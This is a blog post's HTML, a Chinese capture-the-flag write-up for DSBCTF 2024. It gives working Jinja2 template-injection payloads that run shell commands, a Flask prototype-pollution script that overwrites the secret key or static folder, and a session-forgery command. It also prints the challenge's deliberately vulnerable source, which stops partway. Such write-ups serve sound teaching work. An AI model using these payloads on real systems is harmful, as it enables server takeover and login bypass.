@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="签到·好玩的PHP小考点：数字123和字符串123的md5是一样的，但是强比较不一样 ezzz_sstissti有长度限制 利用config是字典的子类，我们可以使用update方法将我们要写的payload给储存到config里面，然后再取出来 目标： 1&#123;&#123;lipsum.__globals__.os.popen(&#x27;cat &#x2F;f*&#x27;).read()&amp;#12">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DSBCTF单身杯2024">
+<meta property="og:url" content="https://rufeii.github.io/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/index.html">
+<meta property="og:site_name" content="Rufeii">
+<meta property="og:description" content="签到·好玩的PHP小考点：数字123和字符串123的md5是一样的，但是强比较不一样 ezzz_sstissti有长度限制 利用config是字典的子类，我们可以使用update方法将我们要写的payload给储存到config里面，然后再取出来 目标： 1&#123;&#123;lipsum.__globals__.os.popen(&#x27;cat &#x2F;f*&#x27;).read()&amp;#12">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2025/11/image-20251129185509255.png">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2025/11/image-20251129185541908.png">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2025/11/image-20251129191712309.png">
+<meta property="article:published_time" content="2025-11-28T13:07:15.000Z">
+<meta property="article:modified_time" content="2025-11-29T12:15:33.577Z">
+<meta property="article:author" content="Rufeii">
+<meta property="article:tag" content="ssti长度限制">
+<meta property="article:tag" content="flask原型链污染">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rufeii.github.io/images/achieve/2025/11/image-20251129185509255.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/website.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/website.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/website.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>DSBCTF单身杯2024</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">ab0ut</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categ0ries</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/11/28/2024%E8%9C%80%E9%81%93%E5%B1%B1/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rufeii.github.io/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rufeii.github.io/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/&text=DSBCTF单身杯2024"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rufeii.github.io/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/&title=DSBCTF单身杯2024"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rufeii.github.io/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/&is_video=false&description=DSBCTF单身杯2024"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DSBCTF单身杯2024&body=Check out this article: https://rufeii.github.io/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rufeii.github.io/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/&title=DSBCTF单身杯2024"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rufeii.github.io/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/&title=DSBCTF单身杯2024"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rufeii.github.io/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/&title=DSBCTF单身杯2024"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rufeii.github.io/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/&title=DSBCTF单身杯2024"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rufeii.github.io/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/&name=DSBCTF单身杯2024&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rufeii.github.io/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/&t=DSBCTF单身杯2024"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%C2%B7%E5%A5%BD%E7%8E%A9%E7%9A%84PHP"><span class="toc-number">1.</span> <span class="toc-text">签到·好玩的PHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezzz-ssti"><span class="toc-number">2.</span> <span class="toc-text">ezzz_ssti</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-inject"><span class="toc-number">3.</span> <span class="toc-text">ez_inject</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-number">3.1.</span> <span class="toc-text">非预期</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%B7%E9%9B%BE%E9%87%8D%E9%87%8D"><span class="toc-number">4.</span> <span class="toc-text">迷雾重重</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        DSBCTF单身杯2024
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Rufeii</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-11-28T13:07:15.000Z" class="dt-published" itemprop="datePublished">2025-11-28</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E8%B5%9B%E9%A2%98/">赛题</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/flask%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="tag">flask原型链污染</a>, <a class="p-category" href="/tags/ssti%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/" rel="tag">ssti长度限制</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="签到·好玩的PHP"><a href="#签到·好玩的PHP" class="headerlink" title="签到·好玩的PHP"></a>签到·好玩的PHP</h2><p>小考点：数字123和字符串123的md5是一样的，但是强比较不一样</p>
+<h2 id="ezzz-ssti"><a href="#ezzz-ssti" class="headerlink" title="ezzz_ssti"></a>ezzz_ssti</h2><p>ssti有长度限制</p>
+<p>利用<code>config</code>是字典的子类，我们可以使用update方法将我们要写的payload给储存到config里面，然后再取出来</p>
+<p>目标：</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>.os.popen(&#x27;cat /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>exp：</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="comment">%set x=config.update(a=lipsum.__globals__)%&#125;#长度太长了</span></span><br><span class="line">可以先把config.update给存一下</span><br><span class="line">&#123;<span class="comment">%set x=config.update(a=config.update)%&#125;</span></span><br><span class="line">&#123;<span class="comment">%set x=config.a(b=lipsum.__globals__)%&#125;</span></span><br><span class="line">&#123;&#123;config.b.os.popen(&#x27;cat /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拿到flag</p>
+<h2 id="ez-inject"><a href="#ez-inject" class="headerlink" title="ez_inject"></a>ez_inject</h2><p>注册进去</p>
+<p><img src="/../images/achieve/2025/11/image-20251129185509255.png" alt="image-20251129185509255"></p>
+<p><img src="/../images/achieve/2025/11/image-20251129185541908.png" alt="image-20251129185541908"></p>
+<p>提示说利用注册去进行原型链污染，而且提到了身份，我们看看cookie</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJwdzUsKhDAQANGrhF4biPmM4lmE0GpnzCIJpBUR8e46U4u3rQtoXotPxIxfggHOsleBmQ-qIrL4147bvAVey3GpT6fIYC9t6PBlWmRvrZKatDPBOQra3GOGBiJ7XFLMMKgGdqaaMf0GrTZwP<span class="built_in">_</span>zzJOE.aSrQ5w.ktXLaj3P75GzmyN1QiItSA52NcI</span><br></pre></td></tr></table></figure>
+
+<p>这里是session，大抵就是flask的session伪造了，密钥提示我们去污染<code>app.config.SECRET_KEY</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://2ee11bb0-05f6-4dda-865c-21b1c010b233.challenge.ctf.show/register&quot;</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;config&quot;</span>:&#123;<span class="string">&quot;SECRET_KEY&quot;</span>:<span class="string">&quot;rufeii&quot;</span>&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url,json=payload)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
+
+<p>然后就是伪造session</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --cookie &quot;&#123;&#x27;is<span class="built_in">_</span>admin&#x27;: 1, &#x27;username&#x27;: &#x27;1&#x27;&#125;&quot; --secret &#x27;rufeii&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/achieve/2025/11/image-20251129191712309.png" alt="image-20251129191712309"></p>
+<p>之后就是ssti不需要<code>&#123;&#123;&#125;&#125;</code>，应该就过滤了点关键字很好打</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cycler[&#x27;<span class="built_in">_</span><span class="built_in">_</span>in&#x27;&#x27;it<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;<span class="built_in">_</span><span class="built_in">_</span>glo&#x27;&#x27;bals<span class="built_in">_</span><span class="built_in">_</span>&#x27;].os.popen(&#x27;ls /&#x27;).read()</span><br><span class="line">cycler[&#x27;<span class="built_in">_</span><span class="built_in">_</span>in&#x27;&#x27;it<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;<span class="built_in">_</span><span class="built_in">_</span>glo&#x27;&#x27;bals<span class="built_in">_</span><span class="built_in">_</span>&#x27;].os.popen(&#x27;nl /f*&#x27;).read()</span><br></pre></td></tr></table></figure>
+
+<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>污染的时候直接尝试污染静态目录</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://3b889b74-472b-4490-8994-17e02fe934b1.challenge.ctf.show/register&quot;</span></span><br><span class="line"></span><br><span class="line">payload=&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;_static_folder&quot;</span>:<span class="string">&quot;/&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, json=payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>最后我把源码拿了一下&#x2F;var&#x2F;www&#x2F;html&#x2F;app.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, abort, session, request, redirect, url_for, render_template, render_template_string, jsonify</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> waf, key</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置SECRET_KEY</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;ctfshow5201314&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;SESSION_COOKIE_NAME&#x27;</span>] = <span class="string">&#x27;user&#x27;</span></span><br><span class="line"></span><br><span class="line">users = &#123;&#125;</span><br><span class="line"></span><br><span class="line">valid_urls = [<span class="string">&#x27;/logout&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;/echo&#x27;</span>, <span class="string">&#x27;/secret&#x27;</span>, <span class="string">&#x27;/register&#x27;</span>, <span class="string">&#x27;/login&#x27;</span>, <span class="string">&#x27;/chat&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CTFer</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = username</span><br><span class="line">        <span class="variable language_">self</span>.password = password</span><br><span class="line">        <span class="variable language_">self</span>.is_admin = <span class="number">0</span>  <span class="comment"># 也可以设置默认的 is_admin</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">isinstance</span>(v, <span class="built_in">dict</span>):</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">isinstance</span>(v, <span class="built_in">dict</span>):</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 装饰器用于验证 URL</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">require_valid_url</span>(<span class="params">f</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> request.path <span class="keyword">not</span> <span class="keyword">in</span> valid_urls:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Access denied&quot;</span>&#125;), <span class="number">403</span></span><br><span class="line">        <span class="keyword">return</span> f(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    wrapper.__name__ = f.__name__  <span class="comment"># 保持视图函数名称</span></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], echo_message=session.get(<span class="string">&#x27;echo_message&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, echo_message=session.get(<span class="string">&#x27;echo_message&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.is_json:  <span class="comment"># 处理 JSON 请求</span></span><br><span class="line">            username = request.json.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">            password = request.json.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Username already exists&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">            ctfer = CTFer(username, password)</span><br><span class="line">            merge(request.json, ctfer)</span><br><span class="line">            users[ctfer.username] = &#123;<span class="string">&#x27;password&#x27;</span>: ctfer.password, <span class="string">&#x27;is_admin&#x27;</span>: ctfer.is_admin&#125;</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Yeah~ You succeeded!&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 处理表单请求</span></span><br><span class="line">        data = request.form.to_dict(flat=<span class="literal">False</span>)</span><br><span class="line">        username = data.get(<span class="string">&#x27;username&#x27;</span>, [<span class="string">&#x27;&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">        password = data.get(<span class="string">&#x27;password&#x27;</span>, [<span class="string">&#x27;&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Username already exists&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>&#125;</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username][<span class="string">&#x27;password&#x27;</span>] == password:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            session[<span class="string">&#x27;is_admin&#x27;</span>] = users[username][<span class="string">&#x27;is_admin&#x27;</span>]</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid credentials&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    session.pop(<span class="string">&#x27;is_admin&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/chat&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chat</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;chat.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 